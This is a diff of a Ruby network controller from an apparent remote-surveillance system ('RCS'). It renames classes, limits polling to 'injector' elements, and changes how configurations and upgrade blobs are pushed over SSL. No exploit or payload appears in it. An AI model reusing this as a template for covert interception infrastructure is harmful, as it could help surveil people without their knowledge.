@@ -4,7 +4,7 @@
 #
 
 # relatives
-require_relative 'protocol'
+require_relative 'legacy_protocol'
 
 # from RCS::Common
 require 'rcs-common/trace'
@@ -17,7 +17,7 @@ require 'timeout'
 module RCS
 module Controller
 
-class Network
+class LegacyNetworkController
   extend RCS::Tracer
 
   # TODO: check this for release
@@ -26,31 +26,22 @@ class Network
 
   def self.check
 
-    # if the database connection has gone
-    # try to re-login to the database again
-    DB.instance.connect!(:controller) if not DB.instance.connected?
+    # if the database connection has gone wait for the next heartbeat
+    return unless DB.instance.connected?
 
     # retrieve the lists from the db
-    elements = DB.instance.proxies
-    elements += DB.instance.collectors
+    elements = DB.instance.injectors
 
     # use one thread for each element
     threads = []
 
-    # keep only the remote anonymizers discarding the local collectors
-    elements.delete_if {|x| x['type'] == 'local'}
-
     # keep only the elements to be polled
     elements.delete_if {|x| x['poll'] == false}
 
-    if elements.empty?
-      # send the status to the db
-      send_status "Idle..."
-    else
-      trace :info, "[NC] Handling #{elements.length} network elements..."
-      # send the status to the db
-      send_status "Handling #{elements.length} network elements..."
-    end
+    # nothing to be done...
+    return if elements.empty?
+
+    trace :info, "[NC] Handling #{elements.length} network elements..."
 
     # contact every element
     elements.each do |p|
@@ -74,7 +65,6 @@ class Network
           # send the logs to db
           logs.each do |log|
             DB.instance.injector_add_log(p['_id'], *log) if p['type'].nil?
-            DB.instance.collector_add_log(p['_id'], *log) unless p['type'].nil?
           end
 
         rescue Exception => e
@@ -95,7 +85,7 @@ class Network
     #  t.join
     #end
 
-    trace :info, "[NC] Network elements check completed"
+    #trace :info, "[NC] Network elements check completed"
   end
 
 
@@ -119,7 +109,7 @@ class Network
     trace :debug, "[NC] #{element['address']} connected"
 
     # create a new NC protocol
-    proto = NCProto.new(ssl_socket)
+    proto = LegacyProtocol.new(ssl_socket)
 
     network_signature = DB.instance.network_signature || File.read(Config.instance.file('rcs-network.sig')).strip
 
@@ -135,38 +125,35 @@ class Network
       command = proto.get_command
       # parse the commands
       case command
-        when NCProto::PROTO_CERT
+        when LegacyProtocol::PROTO_CERT
           trace :info, "[NC] #{element['address']} is requesting the NC Certificate for setup"
           proto.cert
 
-        when NCProto::PROTO_VERSION
+        when LegacyProtocol::PROTO_VERSION
           ver = proto.version
           trace :info, "[NC] #{element['address']} is version #{ver}"
 
           # update the db accordingly
           DB.instance.update_injector_version(element['_id'], ver) if element['type'].nil?
-          DB.instance.update_collector_version(element['_id'], ver) unless element['type'].nil?
 
-        when NCProto::PROTO_CONF
+        when LegacyProtocol::PROTO_CONF
           content = nil
           unless element['configured']
             content = DB.instance.injector_config(element['_id']) if element['type'].nil?
-            content = DB.instance.collector_config(element['_id']) unless element['type'].nil?
             trace :info, "[NC] #{element['address']} has a new configuration (#{content.length} bytes)" unless content.nil?
           end
           proto.config(content)
 
-        when NCProto::PROTO_UPGRADE
+        when LegacyProtocol::PROTO_UPGRADE
           content = nil
           if element['upgradable']
             content = DB.instance.injector_upgrade(element['_id']) if element['type'].nil?
-            content = DB.instance.collector_upgrade(element['_id']) unless element['type'].nil?
             trace :info, "[NC] #{element['address']} has a new upgrade (#{content.length} bytes)" unless content.nil?
             trace :debug, "[NC] #{element['address']} upgrade MD5: #{Digest::MD5.hexdigest(content)}"
           end
           proto.upgrade(content)
 
-        when NCProto::PROTO_MONITOR
+        when LegacyProtocol::PROTO_MONITOR
           result = proto.monitor
           trace :info, "[NC] #{element['address']} monitor is: #{result.inspect}"
 
@@ -180,14 +167,14 @@ class Network
           # add the version to the results
           result << ver
 
-        when NCProto::PROTO_LOG
+        when LegacyProtocol::PROTO_LOG
           time, type, desc = proto.log
           # we have to be fast here, we cannot insert them directly in the db
           # since it will take too much time and we have to finish before the timeout
           # return the array and let the caller insert them
           logs << [time, type, desc]
 
-        when NCProto::PROTO_BYE
+        when LegacyProtocol::PROTO_BYE
           trace :info, "[NC] #{element['address']} end synchronization"
           break
       end
@@ -203,25 +190,22 @@ class Network
   end
 
   # Push a config to a network element
-  def self.push(anon)
-    trace :info, "[NC] PUSHING to #{anon['address']}:#{anon['port']}"
+  def self.push(element)
+    trace :info, "[NC] PUSHING to #{element['address']}:#{element['port']}"
 
-    # contact the anon
-    status, logs = nil
-
-    Timeout::timeout(Config.instance.global['NC_INTERVAL'] - 5) do
-      status, logs = check_element(anon)
-    end
+    # contact the network element
+    status, logs = check_element(element)
 
     # send the results to db
-    report_status(anon, *status) unless status.nil? or status.empty?
-    trace :info, "[NC] PUSHED to #{anon['address']}:#{anon['port']}"
+    report_status(element, *status) unless status.nil? or status.empty?
+    msg = "[NC] PUSHED to #{element['address']}:#{element['port']}"
+    trace :info, msg
 
-    true
+    return 200, msg
   rescue Exception => e
-    msg = "[NC] CANNOT PUSH TO #{anon['address']}: #{e.message}"
-    trace(:warn, msg)
-    raise(msg)
+    msg = "[NC] CANNOT PUSH TO #{element['address']}: #{e.message}"
+    trace :error, msg
+    return 500, msg
   end
 
 
@@ -244,25 +228,6 @@ class Network
 
     # send the status to the db
     DB.instance.update_status component, elem['address'], status, message, stats, internal_component, version
-  end
-
-  
-  def self.send_status(message)
-    # report our status to the db
-    component = "RCS::NetworkController"
-    ip = ''
-
-    # report our status
-    status = SystemStatus.status
-    disk = SystemStatus.disk_free
-    cpu = SystemStatus.cpu_load
-    pcpu = SystemStatus.my_cpu_load(component)
-
-    # create the stats hash
-    stats = {:disk => disk, :cpu => cpu, :pcpu => pcpu}
-
-    # send the status to the db
-    DB.instance.update_status component, ip, status, message, stats, 'nc', $version
   end
 
 end
